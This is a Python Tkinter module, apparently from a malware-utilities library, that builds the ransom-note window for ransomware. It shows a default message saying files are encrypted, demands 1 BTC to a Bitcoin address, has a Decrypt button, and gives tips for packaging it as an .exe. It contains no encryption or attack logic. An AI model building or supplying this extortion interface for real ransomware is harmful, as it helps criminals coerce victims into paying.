"""Ransomware GUI

A example GUI for a single extortion Ransomware.

"""

import logging
import os
import sys
from importlib.resources import files
from tkinter import LEFT, NW, Button, Frame, Label

from PIL import Image, ImageTk
from tkhtmlview import HTMLLabel

logger = logging.getLogger(__name__)


def default_decrypt_function():
    """Dummy decryption function used when no function is specified."""
    logger.info("decrypt checking...")

def load_image():
    return files("mwutils.gui").joinpath("lock.png").open('rb')

def resource_path(relative_path):
    """Get absolute path to resource, works for dev and for PyInstaller"""
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS  # pylint: disable=W0212,E1101
    except Exception:  # pylint: disable=W0718
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


class RW(Frame):
    """
    The frame looks best at a dimension of: `window_width=800`, `window_height=300`

    When building a `.exe` note that this frame requires a `lock.png`.
    The 'lock.png' can be found in the same folder as this module.

    The command to build the `exe` will contain: `... --add-data 'lock.png;.'`

    Example:
        def execute_f():
            print("Run f...")

        def f():
            print("Button pressed...")

        frames = ({'class': RW, 'para': {'decrypt_function': f}},)

        app = App(
            tk_frames=frames, visible_frame=RW, window_width=800, window_height=300
        )

        app.after(2000, execute_f)      # runs after the loop

    """

    def __init__(
        self,
        parent,
        controller,
        decrypt_function: callable = default_decrypt_function,
        info_html: str = None,
    ):
        """

        Args:
            parent (_type_): Tkinter parent.
            controller (_type_): Tkinter parent.
            decrypt_function (callable): Function to be called when the decrypt button is pressed.
            info_html (str): HTML to display in the GUI.
        """

        Frame.__init__(self, parent)
        self.controller = controller
        self.decrypt_function = decrypt_function

        controller.title("Ransomware")

        try:
            self.img = ImageTk.PhotoImage(
                Image.open(load_image()).resize((200, 200))
            )
        except:
            self.img = ImageTk.PhotoImage(
                Image.open(resource_path("lock.png")).resize((200, 200))
            )

        self.panel = Label(self, image=self.img)
        self.panel.pack(side=LEFT, fill="none", expand="false", anchor=NW)

        if info_html is None:
            info_html = """
            <p>Your files have been encrypted.<br>
            Pay to get them back!💸</p>
            <p>Instructions you have to follow:</p>
            <ol>
                <li>How to buy Bitcoin</li>
                <li>Pay: 1 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</li>
                <li>Press the green Decrypt button</li>
            </ol>
            """

        Button(self, text="Decrypt", command=self.decrypt, bg="#A7F432").pack(pady=10)
        label = HTMLLabel(
            self,
            html=info_html,
        )

        # label.fit_height()
        label.pack(pady=0, padx=0)  # fill="both", expand=True

    def decrypt(self):
        """Function called when the 'decrypt' button is pressed."""
        self.decrypt_function()
